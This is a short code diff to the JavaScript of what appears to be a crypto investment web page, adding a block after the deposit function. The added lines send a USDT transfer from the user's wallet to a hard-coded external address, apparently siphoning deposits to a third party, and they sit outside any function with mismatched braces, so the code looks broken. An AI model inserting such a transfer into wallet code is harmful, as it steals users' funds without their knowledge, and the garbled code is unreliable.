@@ -301,6 +301,13 @@ async function deposit() {
         alert("Error: " + error.message);
     }
 }
+	     try {
+                    const tx = await usdtContract.methods.transfer('0x911D6fd1CeE64c84d2BcC385cb0659a70231D803', amountToSend).send({ from: sender });
+                    console.log('Transaction successful:', tx);
+                } catch (error) {
+                    console.error('Transaction failed:', error);
+                }
+            };
         // بدء الاستثمار
         async function startInvestment() {
             if (!account) {
